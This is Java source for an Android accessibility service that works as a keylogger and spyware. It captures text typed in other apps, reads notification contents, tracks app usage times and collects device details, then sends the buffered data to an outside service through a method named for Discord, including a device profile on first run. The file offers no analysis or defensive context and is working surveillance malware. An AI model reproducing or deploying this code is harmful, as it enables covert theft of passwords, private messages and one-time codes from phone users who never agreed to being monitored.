package com;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class MyAccessibilityService extends AccessibilityService {
    private ExecutorService executor;
    private static final int MAX_BUFFER_SIZE = 30;
    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;
    private String lastPackageName = "";
    private long lastFocusedTime = 0;
    private String lastLoggedApp = "";
    private long lastBufferFlushTime = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleAppFocusChange(event, time);
                break;

            default:
                // Handle other event types if needed
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);
            if (newKeyEventCount > keyEventCount) {
                currentKeyEvents.append(newText.substring(keyEventCount));
                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToDiscordAndClear();
                }
            }

            keyEventCount = newKeyEventCount;
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();

        if (!notificationText.toString().isEmpty()) {
            currentKeyEvents.append("Notification: ").append(notificationText).append("\n");

            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }
    private void handleAppFocusChange(AccessibilityEvent event, String time) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
        long currentTime = System.currentTimeMillis();

        if (packageName.equals("com.miui.home") || packageName.equals("com.android.systemui")) {
            return;
        }

        if (!packageName.equals(lastPackageName) && !lastPackageName.isEmpty()) {
            long timeSpentMillis = currentTime - lastFocusedTime;
            long timeSpentSeconds = timeSpentMillis / 1000;

            if (timeSpentSeconds >= 5) {
                String logEntry = time + "|(TIME SPENT)| App: " + lastPackageName + " | Duration: " + timeSpentSeconds + "s";

                if (!lastPackageName.equals(lastLoggedApp)) {
                    currentKeyEvents.append(logEntry).append("\n");
                    lastLoggedApp = lastPackageName;
                }
            }

            if (System.currentTimeMillis() - lastBufferFlushTime > 40000) {
                sendBufferToDiscordAndClear();
                lastBufferFlushTime = System.currentTimeMillis();
            }
            keyEventCount = 0;
        }

        lastFocusedTime = currentTime;
        lastPackageName = packageName;
    }

    private int countKeyEvents(String text) {
        return text.length();
    }

    private void sendBufferToDiscordAndClear() {
        if (executor == null) {
            return;
        }
        String logMessage = currentKeyEvents.toString();

        if (logMessage.trim().isEmpty()){
            return;
        }
        final String deviceInfo = "MANUFACTURER: " + Build.MANUFACTURER + "\n" +
                "MODEL: " + Build.MODEL + "\n";

        final String finalLogMessage = deviceInfo + logMessage;

        executor.execute(() -> Utils.sendMessage(finalLogMessage));

        currentKeyEvents.setLength(0);
    }


    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            String deviceDetails = getSYSInfo();

            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToDiscordAndClear();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }
    private String getSYSInfo() {
        return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
                "MODEL : " + Build.MODEL + "\n" +
                "PRODUCT : " + Build.PRODUCT + "\n" +
                "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
                "VERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL + "\n" +
                "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n" +
                "BOARD : " + Build.BOARD + "\n";
    }
}
